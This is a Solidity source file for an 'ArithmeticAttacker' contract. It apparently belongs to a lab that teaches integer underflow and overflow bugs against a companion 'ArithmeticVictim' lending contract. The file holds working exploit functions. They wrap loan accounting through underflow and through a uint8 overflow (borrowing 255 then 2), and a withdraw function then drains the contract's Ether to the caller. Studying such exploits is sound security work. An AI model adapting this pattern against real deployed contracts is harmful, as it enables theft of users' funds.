pragma solidity 0.8.19;
//SPDX-License-Identifier: UNLICENSED
import "./ArithmeticVictim.sol";

contract ArithmeticAttacker{
    ArithmeticVictim public victim;

    constructor(address _victim) {
        victim = ArithmeticVictim(_victim);
    }

    function attackWithUnderflow() external payable{
        //attacker will borrow a lot but the loan will be repaid with a very small amount
        victim.joinCollective();
        victim.borrow(1);
        victim.repay{value:2}(2);
    }

    function attackWithOverflow() external returns(uint8){
        //the attacker will borrow a lot but the loan value will be small
        require(address(victim).balance>=257, "Not enough balance in victim to attack");

        victim.joinCollective();
        victim.borrow(255);
        victim.borrow(2);
        //we expect that the loan amount for this attacker to be only one eth

        return victim.getLoanAmount(address(this));
    }

    function withdraw() public{
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw Ether");

    }

    receive() external payable{
    }
}